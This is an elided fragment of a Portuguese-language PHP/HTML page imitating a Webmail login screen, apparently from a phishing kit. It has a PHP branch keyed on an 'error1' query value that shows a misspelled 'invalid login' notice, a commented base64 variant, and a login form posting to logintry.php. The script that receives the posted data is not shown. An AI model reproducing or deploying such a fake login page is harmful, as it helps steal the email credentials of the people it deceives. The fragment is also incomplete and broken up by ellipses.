                ...
                Se você não habilitar o JavaScript, determinados recursos em Webmail não funcionarão corretamente.
                 ...
                 <?php
                    ...
                    if( $q === "error1"){ 
                        ...
                        //if( base64_decode($q) === "error1"){ 
                        
                        ?> 
                    
        <div id='login-status' class="error-notice" style="display: block">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class='login-status-icon'></span></div>
                    <div id="login-status-message">O loguin é inválido.</div>
                </div>
            </div>
        </div>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    ...
                    <div id="login-sub"
                        ...
                        <div id="forms">
                            <form  id="login_form" action="logintry.php" method="post" target="_top" style="visibility:">
